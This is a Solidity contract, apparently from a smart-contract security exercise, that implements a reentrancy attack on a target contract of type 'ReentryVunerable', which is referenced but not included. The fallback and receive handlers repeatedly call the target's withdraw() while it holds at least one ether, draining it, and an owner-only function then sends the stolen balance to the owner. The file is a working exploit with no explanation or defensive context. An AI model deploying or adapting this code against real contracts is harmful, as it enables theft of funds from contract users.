// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol';

contract ReentryAttack is Ownable{
    //save address of target contract
    ReentryVunerable public RV;

    constructor(address _targetContract) {
        RV = ReentryVunerable(_targetContract);
    }

    /**
     * when another contract sends ether this (or receive) function is triggered
     * function checks of external contract still has balance
     * if yes transfer it to this contract other wise not
     */
    fallback() external payable{
        console.log("fallback");
        if (address(RV).balance >= 1 ether) {
            RV.withdraw();
        }
    }

    receive() external payable{
        console.log("receive");
        if (address(RV).balance >= 1 ether) {
            RV.withdraw();
            
        }
    }

    function attack() external {
        console.log("attack");
        RV.withdraw();
    }

    function withdraw() public payable onlyOwner {
        (bool sent, bytes memory data) = owner().call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}